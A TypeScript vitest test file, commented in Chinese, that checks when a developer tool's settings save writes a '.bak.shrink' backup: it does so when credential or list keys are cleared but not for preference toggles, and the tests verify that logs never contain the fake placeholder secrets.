describe("第七轮 P2-1：收缩判定只看「凭据与列表类」键，无关操作不顶掉好备份", () => {
  const shrinkPath = (): string => `${settingsFilePath()}.bak.shrink`;
  const exists = (p: string): Promise<boolean> =>
    fs.stat(p).then(
      () => true,
      () => false,
    );
  const readJson = async (p: string): Promise<unknown> =>
    JSON.parse(await fs.readFile(p, "utf-8"));
  const cleanDir = async (): Promise<void> => {
    const dir = path.dirname(settingsFilePath());
    for (const name of await fs.readdir(dir)) {
      if (
        name.startsWith("config.json.corrupt-") ||
        name === "config.json.bak" ||
        name === "config.json.bak.shrink" ||
        name.includes(".tmp.")
      ) {
        await fs.rm(path.join(dir, name), { recursive: true, force: true });
      }
    }
  };
  const resetTo = async (cfg: unknown): Promise<void> => {
    await cleanDir();
    await fs.writeFile(settingsFilePath(), JSON.stringify(cfg), "utf-8");
  };

  // 假凭据只用来构造输入。断言一律走布尔（键名 / 是否存在 / 数量），失败时 vitest 也不会把任何值打进输出。
  const CP_A = {
    id: "cp_a",
    name: "A",
    baseUrl: "https://a.invalid",
    apiKey: "sk-FAKE-R7-CP-A-0001",
    format: "openai",
  };
  const CP_B = { ...CP_A, id: "cp_b", name: "B", apiKey: "sk-FAKE-R7-CP-B-0002" };
  /** 本地无鉴权端点：apiKey 本来就是空串 */
  const CP_LOCAL = { ...CP_A, id: "cp_local", name: "L", apiKey: "" };
  const SERVER_1 = {
    env: "test",
    host: "h1.invalid",
    port: 22,
    user: "u",
    password: "pw-FAKE-R7-SSH-0003",
  };
  const SERVER_2 = { ...SERVER_1, host: "h2.invalid", password: "pw-FAKE-R7-SSH-0004" };
  const PG_1 = {
    env: "test",
    host: "pg.invalid",
    port: 5432,
    user: "u",
    password: "pw-FAKE-R7-PG-0005",
    readonly: true,
  };
  /**
   * 刚点「添加」还没填任何文本的空白行。⚠ 夹具用的是 `env: ""`，**不是**设置页真实落盘的默认行（那里是 `env: "test"`）——
   * 所以这里删掉 "env" 豁免测试仍绿（第八轮 L1-05）；真实默认行的覆盖（9 个子系统、env: "test"）在 tests/settings-shrink-r8.test.ts。
   * 空白行判定与设置页共用 company-env.ts 的 isBlankCompanyEnvRow。
   */
  const BLANK_ROW = { env: "", host: "", port: 6379, db: 0, password: "", readonly: true };
  const FULL: Record<string, unknown> = {
    apiKey: "sk-FAKE-R7-MAIN-0001",
    gitToken: "glpat-FAKE-R7-0002",
    defaultModel: { id: "composer-2" },
    repos: [
      { name: "web", path: "/repo/web" },
      { name: "api", path: "/repo/api" },
    ],
    mcpServers: { feishu: { url: "https://x" } },
    customProviders: [CP_A, CP_B],
    companyEnv: { ...emptyCompanyEnv(), servers: [SERVER_1], pg: [PG_1] },
    // 以下是偏好类键：开关 / 星标 / 禁用名单 / 模板
    starredModels: { cursor: ["m1"] },
    disabledSkills: ["s1"],
    disabledRules: ["r1"],
    disabledMcpServers: ["m1"],
    branchTemplate: "feature/{storyId}",
    userRole: "frontend",
    isolateWorktreeDefault: true,
    feishuBridgeKeepAwake: true,
    teamKnowledgeEnabled: true,
    feishuChatBridge: true,
    reuseAgentDefault: true,
  };
  const SECRETS = [
    FULL.apiKey,
    FULL.gitToken,
    CP_A.apiKey,
    CP_B.apiKey,
    SERVER_1.password,
    SERVER_2.password,
    PG_1.password,
  ] as string[];
  const withCompanyEnv = (patch: Record<string, unknown>): Record<string, unknown> => ({
    companyEnv: { ...(FULL.companyEnv as Record<string, unknown>), ...patch },
  });

  const sameJson = (a: unknown, b: unknown): boolean =>
    JSON.stringify(a) === JSON.stringify(b);
  const isRecord = (v: unknown): v is Record<string, unknown> =>
    typeof v === "object" && v !== null && !Array.isArray(v);
  /** .bak.shrink 里的 repos 仍是收缩前的两个仓（只比 path，不碰凭据） */
  const shrinkKeepsOldRepos = async (): Promise<boolean> => {
    if (!(await exists(shrinkPath()))) return false;
    const repos = (await readJson(shrinkPath())) as { repos?: unknown };
    return (
      Array.isArray(repos.repos) &&
      repos.repos.map((r) => (isRecord(r) ? r.path : null)).join(",") === "/repo/web,/repo/api"
    );
  };
  const shrinkKeepsApiKey = async (): Promise<boolean> =>
    (await exists(shrinkPath())) &&
    ((await readJson(shrinkPath())) as { apiKey?: unknown }).apiKey === FULL.apiKey;
  const rawShrink = (): Promise<string> => fs.readFile(shrinkPath(), "utf-8");

  afterEach(async () => {
    vi.restoreAllMocks();
    await cleanDir();
    await fs.writeFile(settingsFilePath(), JSON.stringify(VALID_CONFIG), "utf-8");
  });

  it("审查方序列：完整配置 → 清空 repos（.bak.shrink 存下旧 repos）→ 只把一个默认开启的开关 true→false → .bak.shrink 仍含旧 repos 与 apiKey", async () => {
    await resetTo(FULL);
    expect((await putSettingsFile({ ...FULL, repos: [] })).status).toBe("ok");
    expect(await shrinkKeepsOldRepos()).toBe(true);
    expect(await shrinkKeepsApiKey()).toBe(true);
    const before = await rawShrink();

    const toggled = await putSettingsFile({ ...FULL, repos: [], teamKnowledgeEnabled: false });
    expect(toggled.status).toBe("ok");
    // 开关确实写进了 config.json（不是空转）
    const disk = (await readJson(settingsFilePath())) as Record<string, unknown>;
    expect(disk.teamKnowledgeEnabled).toBe(false);
    expect(Array.isArray(disk.repos) && disk.repos.length === 0).toBe(true);
    // 好备份没被顶掉
    expect((await rawShrink()) === before).toBe(true);
    expect(await shrinkKeepsOldRepos()).toBe(true);
    expect(await shrinkKeepsApiKey()).toBe(true);
  });

  it("清空 repos 之后连续做一串日常操作（关开关 / 取消星标 / 重新启用 skill 与 rule / 清分支模板），好备份逐字节不变", async () => {
    await resetTo(FULL);
    expect((await putSettingsFile({ ...FULL, repos: [] })).status).toBe("ok");
    const before = await rawShrink();
    let cur: Record<string, unknown> = { ...FULL, repos: [] };
    for (const patch of [
      { isolateWorktreeDefault: false },
      { feishuBridgeKeepAwake: false },
      { teamKnowledgeEnabled: false },
      { feishuChatBridge: false },
      { starredModels: {} },
      { disabledSkills: [] },
      { disabledRules: [] },
      { disabledMcpServers: [] },
      { branchTemplate: "" },
    ]) {
      cur = { ...cur, ...patch };
      expect((await putSettingsFile(cur)).status).toBe("ok");
      expect((await rawShrink()) === before).toBe(true);
    }
  });

  it("清空 repos 之后添加再删除一条空白的公司环境行：不是收缩，好备份不被顶掉", async () => {
    await resetTo(FULL);
    expect((await putSettingsFile({ ...FULL, repos: [] })).status).toBe("ok");
    const before = await rawShrink();
    const cleared = { ...FULL, repos: [] };
    // 添加空白行（blank 行会被 company-env-card 立即落盘）
    expect(
      (await putSettingsFile({ ...cleared, ...withCompanyEnv({ redis: [BLANK_ROW] }) })).status,
    ).toBe("ok");
    // 空白行删除不需要确认、也立即落盘
    expect((await putSettingsFile({ ...cleared, ...withCompanyEnv({ redis: [] }) })).status).toBe(
      "ok",
    );
    expect((await rawShrink()) === before).toBe(true);
    expect(await shrinkKeepsOldRepos()).toBe(true);
  });

  // 偏好类键（开关 / 星标 / 禁用名单 / 模板 / 默认模型 / 角色）不是「丢了一份可找回的配置」
  it.each<[string, Record<string, unknown>]>([
    ["teamKnowledgeEnabled true→false", { teamKnowledgeEnabled: false }],
    ["isolateWorktreeDefault true→false", { isolateWorktreeDefault: false }],
    ["feishuBridgeKeepAwake true→false", { feishuBridgeKeepAwake: false }],
    ["feishuChatBridge true→false", { feishuChatBridge: false }],
    ["reuseAgentDefault true→false", { reuseAgentDefault: false }],
    ["取消星标模型（starredModels 变空对象）", { starredModels: {} }],
    ["重新启用 skill（disabledSkills 变空）", { disabledSkills: [] }],
    ["重新启用 rule（disabledRules 变空）", { disabledRules: [] }],
    ["重新启用 MCP（disabledMcpServers 变空）", { disabledMcpServers: [] }],
    ["清空分支模板", { branchTemplate: "" }],
    ["清空默认模型", { defaultModel: {} }],
    ["清掉角色", { userRole: undefined }],
  ])("不算收缩：%s", async (_name, patch) => {
    await resetTo(FULL);
    const res = await putSettingsFile({ ...FULL, ...patch });
    expect(res.status).toBe("ok");
    expect(await exists(shrinkPath())).toBe(false);
  });

  // 凭据与列表类键 + 嵌套层面：顶层键数看不出来的清空
  it.each<[string, Record<string, unknown>, string]>([
    ["apiKey 清空", { apiKey: "" }, "apiKey"],
    ["gitToken 清空", { gitToken: "" }, "gitToken"],
    ["repos 清空", { repos: [] }, "repos"],
    ["mcpServers 清空", { mcpServers: {} }, "mcpServers"],
    ["customProviders 整组清空", { customProviders: [] }, "customProviders"],
    ["customProviders 缺失", { customProviders: undefined }, "customProviders"],
    [
      "customProviders 里条目的 apiKey 被清（条目还在、顶层数组仍非空）",
      { customProviders: [{ ...CP_A, apiKey: "" }, CP_B] },
      "customProviders",
    ],
    [
      "customProviders 删掉一条带 key 的（另一条还在）",
      { customProviders: [CP_B] },
      "customProviders",
    ],
    ["companyEnv.servers 清空", withCompanyEnv({ servers: [] }), "companyEnv.servers"],
    ["companyEnv.pg 清空", withCompanyEnv({ pg: [] }), "companyEnv.pg"],
    ["companyEnv 整个缺失", { companyEnv: undefined }, "companyEnv.servers"],
  ])("算收缩：%s → .bak.shrink = 收缩前的完整配置，日志只含键名", async (_name, patch, keyName) => {
    await resetTo(FULL);
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const res = await putSettingsFile({ ...FULL, ...patch });
    expect(res.status).toBe("ok");
    expect(await exists(shrinkPath())).toBe(true);
    expect(sameJson(await readJson(shrinkPath()), FULL)).toBe(true);
    const logged = JSON.stringify(warn.mock.calls);
    expect(logged.includes(keyName)).toBe(true);
    for (const secret of SECRETS) expect(logged.includes(secret)).toBe(false);
  });

  it("companyEnv 每个子系统（取自 emptyCompanyEnv，新增子系统自动覆盖）整组清空都算收缩，日志只点该子系统的键名", async () => {
    const keys = Object.keys(emptyCompanyEnv());
    expect(keys.length).toBeGreaterThanOrEqual(9);
    // 每个子系统用各自的真实形态「有内容」行：取自 COMPANY_ENV_TEMPLATE（类型是 CompanyEnv，新增子系统不补模板过不了 tsc）。
    // ⚠ 第八轮 L1-03 起收缩判定先过 normalizeCompanyEnv，只认各子系统的已知字段——以前这里用一行通用的
    // `{ env, host, name, url, content }`，xxljob / nacos / elk / sls 这些没有 host 的子系统，通用行归一后是空白行，不再算「有内容」。
    const template = COMPANY_ENV_TEMPLATE as unknown as Record<string, unknown[]>;
    for (const k of keys) expect(template[k]?.length, `COMPANY_ENV_TEMPLATE.${k}`).toBeGreaterThan(0);
    const previousEnv = Object.fromEntries(keys.map((k) => [k, template[k]]));
    for (const key of keys) {
      await resetTo({ ...FULL, companyEnv: previousEnv });
      const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
      const res = await putSettingsFile({ ...FULL, companyEnv: { ...previousEnv, [key]: [] } });
      expect(res.status, key).toBe("ok");
      expect(await exists(shrinkPath()), key).toBe(true);
      const logged = JSON.stringify(warn.mock.calls);
      expect(logged.includes(`companyEnv.${key}`), key).toBe(true);
      warn.mockRestore();
    }
  });

  it.each<[string, Record<string, unknown>, Record<string, unknown>]>([
    [
      "customProviders 的 apiKey 换成另一把非空 key",
      {},
      { customProviders: [{ ...CP_A, apiKey: "sk-FAKE-R7-CP-A-ROTATED" }, CP_B] },
    ],
    [
      "本来就没有 key 的本地端点保持为空",
      { customProviders: [CP_A, CP_LOCAL] },
      { customProviders: [CP_A, CP_LOCAL] },
    ],
    [
      "删掉一条本来就没有 key 的 provider",
      { customProviders: [CP_A, CP_LOCAL] },
      { customProviders: [CP_A] },
    ],
    [
      "companyEnv 删掉一条空白行（子系统本来就没有内容）",
      withCompanyEnv({ redis: [BLANK_ROW] }),
      withCompanyEnv({ redis: [] }),
    ],
    [
      "companyEnv.servers 两行变一行（仍有内容）",
      withCompanyEnv({ servers: [SERVER_1, SERVER_2] }),
      withCompanyEnv({ servers: [SERVER_1] }),
    ],
    [
      "companyEnv 只改了某台服务器的密码（换新值）",
      {},
      withCompanyEnv({ servers: [{ ...SERVER_1, password: "pw-FAKE-R7-SSH-ROTATED" }] }),
    ],
    [
      "companyEnv 全是空数组 → 缺失（本来就没配）",
      { companyEnv: emptyCompanyEnv() },
      { companyEnv: undefined },
    ],
  ])("不算收缩：%s", async (_name, prevPatch, nextPatch) => {
    await resetTo({ ...FULL, ...prevPatch });
    const res = await putSettingsFile({ ...FULL, ...nextPatch });
    expect(res.status).toBe("ok");
    expect(await exists(shrinkPath())).toBe(false);
  });
});
